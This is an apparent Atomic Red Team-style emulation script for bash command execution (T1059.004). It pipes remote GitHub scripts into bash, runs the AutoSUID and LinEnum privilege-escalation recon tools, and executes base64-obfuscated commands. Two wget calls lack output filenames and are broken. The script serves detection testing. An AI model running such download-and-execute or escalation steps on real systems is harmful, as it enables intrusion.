#! /bin/bash

# T1059.004 - Command and Scripting Interpreter: Bash

function a() {
# Atomic Test 1 - Create and Execute Bash Shell Script
    echo  $(date -u) "Start of T1059.004 - Create and Execute Bash Shell Script" >> /tmp/attacktest.txt
    sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
    sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
    chmod +x /tmp/art.sh
    sh /tmp/art.sh
    echo  $(date -u) "Completed T1059.004 - Create and Execute Bash Shell Script" >> /tmp/attacktest.txt
    sleep 60
}

function b() {
# Atomic Test #2 - Command-Line Interface
# Using Curl to download and pipe a payload to Bash
    echo "==============================="
    echo $(date -u) "Start of T1059.004 - Command-Line Interface" >> /tmp/attacktest.txt
    curl -sS https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/echo1.sh | bash
    wget --quiet -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/echo2.sh | bash
    echo  $(date -u) "Completed T1059.004 - Command-Line Interface" >> /tmp/attacktest.txt
    sleep 60
}

function c() {
# Atomic Test 3 - Harvest SUID executable files
# AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
    echo $(date -u) "Start of T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
    wget -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh | bash >> /tmp/attackresults.txt
    echo  $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt    
    sleep 60
}

function d() {
# Atomic Test 3 - Harvest SUID executable files
# AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
    echo $(date -u) "Start of T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
    wget -O https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh
    chmod +x autosuid.sh
    bash autosuid.sh
    echo $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
    sleep 60
}

function e() {
# Atomic Test 4 - LinEnum tool execution
# LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.
    echo $(date -u) "Start of T1059.004 - LinEnum tool execution" >> /tmp/attacktest.txt
    wget -O https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/linenum.sh
    chmod +x linenum.sh
    bash linenum.sh
    echo $(date -u) "Completed T1059.004 - LinEnum tool execution" >> /tmp/attacktest.txt
    sleep 60
}

function f() {
# Atomic Test 5 - New script file in the tmp directory
# An attacker may create script files in the /tmp directory using the mktemp utility and execute them.
    echo $(date -u) "Start of T1059.004 - New script file in the tmp directory" >> /tmp/attacktest.txt
    TMPFILE=$(mktemp)
    echo "id" > $TMPFILE
    bash $TMPFILE
    echo $(date -u) "Completed T1059.004 - New script file in the tmp directory" >> /tmp/attacktest.txt
    sleep 60
}

function g() {
# Atomic Test 8 - Command line scripts
# An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host.
    echo $(date -u) "Start of T1059.004 - Command line scripts" >> /tmp/attacktest.txt
    for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done >> /tmp/attackresults.txt
    echo $(date -u) "Completed T1059.004 - Command line scripts" >> /tmp/attacktest.txt
    sleep 60
}

function h() {
# Atomic Test #9 - Obfuscated command line scripts
# An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection.
    echo $(date -u) "Start of T1059.004 - Obfuscated command line scripts" >> /tmp/attacktest.txt
    ART=$(echo -n "id" |base64 -w 0)
    echo "\$ART=$ART"
    echo -n "$ART" |base64 -d |/bin/bash >> /tmp/attackresults.txt
    unset ART
    echo $(date -u) "Completed T1059.004 - Obfuscated command line scripts" >> /tmp/attacktest.txt
    sleep 60
}

function z() {
    rm /tmp/art.sh
    rm autosuid.sh
    rm linenum.sh
    rm $TMPFILE
    unset TMPFILE
    echo $(date -u) "Cleaned up T1059.004" >> /tmp/attacktest.txt
}




a
b
c
d
e
f
g
h
z

